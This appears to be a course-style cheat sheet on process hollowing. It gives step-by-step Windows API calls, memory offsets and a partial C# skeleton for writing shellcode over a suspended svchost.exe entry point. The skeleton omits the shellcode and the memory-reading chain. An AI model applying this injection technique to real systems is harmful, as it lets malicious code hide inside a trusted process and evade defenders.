# 04.02 Process Hollowing

> Section 5.4 · CREATE_SUSPENDED → read PEB → parse PE EntryPoint → overwrite

## Overview

Create a suspended svchost.exe, then overwrite its EntryPoint with shellcode before it runs. Steps: CreateProcess(CREATE_SUSPENDED) → ZwQueryInformationProcess to get PEB address → ReadProcessMemory to read image base at PEB+0x10 → read PE headers to find EntryPoint RVA at offset 0x28 from NT header → WriteProcessMemory shellcode to EntryPoint → ResumeThread.

## Steps

- **CreateProcess** — `svchost.exe`, `CREATE_SUSPENDED (0x4)` flag → process paused before first instruction.
- **ZwQueryInformationProcess** — `ProcessBasicInformation (0)` → returns PROCESS_BASIC_INFORMATION with PEB address.
- **ReadProcessMemory** — read 8 bytes at `PEB + 0x10` → image base address.
- **Read PE headers** — read 0x200 bytes from image base; find `e_lfanew` at offset 0x3C; add to base to find PE header; add 0x28 for AddressOfEntryPoint RVA.
- **Calculate EntryPoint VA** — `image_base + entry_rva`.
- **WriteProcessMemory** — write shellcode to EntryPoint.
- **ResumeThread** — execution starts at our shellcode.

## Commands

### Process hollowing C# skeleton

```csharp
// Key APIs needed (add DllImports)
// CreateProcessW  — dwCreationFlags = 0x4 (CREATE_SUSPENDED)
// ZwQueryInformationProcess  — ProcessBasicInformation class = 0
// ReadProcessMemory
// WriteProcessMemory
// ResumeThread

// PROCESS_BASIC_INFORMATION layout (64-bit):
//   [0]  NTSTATUS ExitStatus
//   [8]  PEB*     PebBaseAddress   ← we want this
//  [16]  ULONG_PTR AffinityMask
//  [24]  LONG      BasePriority
//  [32]  ULONG_PTR UniqueProcessId
//  [40]  ULONG_PTR InheritedFromUniqueProcessId

// PE header offsets:
//   e_lfanew  : image_base + 0x3C  (4 bytes)  → offset to PE header
//   EntryRVA  : image_base + e_lfanew + 0x28  (4 bytes)
//   EntryVA   : image_base + EntryRVA

StartupInfo si = new StartupInfo();
ProcessInformation pi = new ProcessInformation();
bool created = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe",
    IntPtr.Zero, IntPtr.Zero, false, 4 /* CREATE_SUSPENDED */, IntPtr.Zero,
    null, ref si, out pi);

// ... ZwQueryInformationProcess, ReadProcessMemory chain ...
// ... WriteProcessMemory(pi.hProcess, entryVA, shellcode, ...) ...
ResumeThread(pi.hThread);
```
